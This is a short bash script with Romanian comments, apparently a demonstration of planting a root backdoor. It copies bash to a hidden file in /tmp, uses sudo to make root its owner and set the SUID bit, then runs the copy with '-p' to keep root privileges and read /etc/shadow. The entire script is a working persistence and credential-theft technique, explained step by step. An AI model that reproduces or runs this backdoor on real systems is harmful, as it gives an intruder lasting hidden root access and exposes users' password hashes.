#!/bin/bash

# 1. Copiem shell-ul curent (bash) într-o locație ascunsă în /tmp
cp /bin/bash /tmp/.hidden_bash

# 2. Schimbăm proprietarul fișierului pentru a fi root
# (Aici atacatorul presupune că are drepturi de sudo pentru această comandă)
sudo chown root:root /tmp/.hidden_bash

# 3. SETĂM BITUL SUID (4755)
# Asta înseamnă că oricine va rula .hidden_bash, îl va rula cu permisiunile 
# proprietarului său (care acum este root), nu ale utilizatorului curent!
sudo chmod 4755 /tmp/.hidden_bash

# 4. Verificăm că atributele au fost setate corect
ls -la /tmp/.hidden_bash

# 5. EXECUȚIA BACKDOOR-ULUI
# Rulăm copia noastră ascunsă. Argumentul '-p' îi spune bash-ului să NU 
# renunțe la privilegiile de root (să păstreze EUID = 0).
# Apoi executăm o comandă care în mod normal ar fi interzisă (citirea parolelor).
/tmp/.hidden_bash -p -c "cat /etc/shadow | head -n 1"
